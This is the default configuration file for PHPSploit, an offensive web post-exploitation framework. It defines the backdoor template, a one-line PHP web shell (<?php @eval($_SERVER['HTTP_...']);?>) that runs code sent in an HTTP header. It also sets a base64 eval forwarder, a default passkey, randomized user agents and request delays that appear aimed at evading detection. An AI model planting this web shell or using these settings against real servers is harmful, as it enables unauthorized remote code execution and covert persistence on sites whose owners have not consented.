###############################################################################
######################   PHPSPLOIT DEFAULT CONFIG FILE   ######################
###############################################################################


########## SAVEPATH ##########
### directory path to save phpsploit sessions:
### Example: SAVEPATH=/home/user/phpsploit-sessions
SAVEPATH=%%TEMPDIR%%

########### TMPPATH ##########
### directory path to write temporary files:
### Example: TMPPATH=/tmp/
TMPPATH=%%TEMPDIR%%

########### PROXY ############
### http proxy to use for requests:
### Example: PROXY=127.0.0.1:8118
PROXY=None

########## PASSKEY ###########
### Payload main variable to use
### for backdoor tunelling:
### Example: PASSKEY=my_passkey
PASSKEY=phpSpl01t

########## BACKDOOR ##########
### template of backdoor syntax to use:
### Requiements: to be phpsploit compatible, your backdoor
### have to eval the %%PASSKEY%% http header
BACKDOOR=<?php @eval($_SERVER['HTTP_%%PASSKEY%%']);?>

###### HTTP_USER_AGENT #######
### user-agent to use for requests:
### Example: HTTP_USER_AGENT=file://~/data/http/common-user-agents.lst
###          HTTP_USER_AGENT=Firefox 3.6.8 (FreeBSD)
### A value starting with file:// will randomly choose
### one line as value for each use
HTTP_USER_AGENT=file://framework/misc/http_user_agents.lst

######### TEXTEDITOR #########
### soft to use for text edition
## Example: TEXTEDITOR=/usr/bin/vi
TEXTEDITOR=%%WHICH/NANO,VIM,NOTEPAD%%

######### WEBBROWSER #########
### web browser to use for html view
### Example: WEBBROWSER=/usr/bin/firefox
### -Q: What is "%%DEFAULT%%" ?
### -R: Its the system's default web browser
WEBBROWSER=%%DEFAULT%%

##### REQ_DEFAULT_METHOD ####
### default method used to send payloads
### Accepted values: GET or POST
REQ_DEFAULT_METHOD=GET

##### REQ_HEADER_PAYLOAD ####
### the php eval code for payload
### execution of the header forwarder
### Info: various http servers automatically
###       ecape the quotes in headers, for this
###       reason it's more versatile to not use
###       quotes in the forwarder.
### the %%BASE64%% string is the base64 payload,
### so you need to keep it in the string.
REQ_HEADER_PAYLOAD=eval(base64_decode(%%BASE64%%))

###### REQ_MAX_HEADERS ######
### maximum headers allowed by server
### Example: REQ_MAX_HEADERS=50
REQ_MAX_HEADERS=100

#### REQ_MAX_HEADER_SIZE ####
### max size of each http header
### Example: REQ_MAX_HEADER_SIZE=15Kb
REQ_MAX_HEADER_SIZE=8Kb

##### REQ_MAX_POST_SIZE #####
### max size of a post request's body
### Example: REQ_MAX_POST_SIZE=10Mio
REQ_MAX_POST_SIZE=8Mb

##### REQ_ZLIB_TRY_LIMIT ####
### don't compress payloads greater than this limit
### Info: Compression reduces the number of needed requests
###       to send a multipart payload but drastically slow down
###       the computing time of the payload builder
### Example: REQ_ZLIB_TRY_LIMIT=1mb
REQ_ZLIB_TRY_LIMIT=5mb

######## REQ_INTERVAL #######
### interval between two requests
### Example: REQ_INTERVAL=0.2-1
###     to wait between 200ms and 1s
REQ_INTERVAL=1-10
